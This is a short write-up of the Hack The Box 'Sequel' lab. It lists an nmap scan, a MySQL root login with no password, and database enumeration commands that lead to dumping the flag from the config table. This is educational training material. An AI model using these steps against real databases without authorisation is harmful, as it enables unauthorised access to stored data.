# HTB - Sequel (Tier 1)
**Difficulty:** Very Easy
**OS:** Linux

## Tools Used
- nmap
- mysql

## Steps
1. Connected Kali VM to HTB network via OpenVPN
2. Ran `nmap -sV <IP>` — found port 3306 (MySQL/MariaDB) open
3. Connected as root with no password: `mysql -h <IP> -u root`
4. Ran `show databases;` — found 4 databases, unique one was `htb`
5. Switched to it: `use htb;`
6. Listed tables: `show tables;` — found `config` and `users`
7. Checked structure: `describe config;`
8. Retrieved all data: `select * from config;` — found the flag

## What I Learned
- MySQL/MariaDB instances are often left without 
  root password — always check
- `show databases` and `show tables` are first steps 
  when enumerating a database
- `describe` shows table structure; `select *` shows 
  actual data inside
- Databases can store sensitive information in plain text
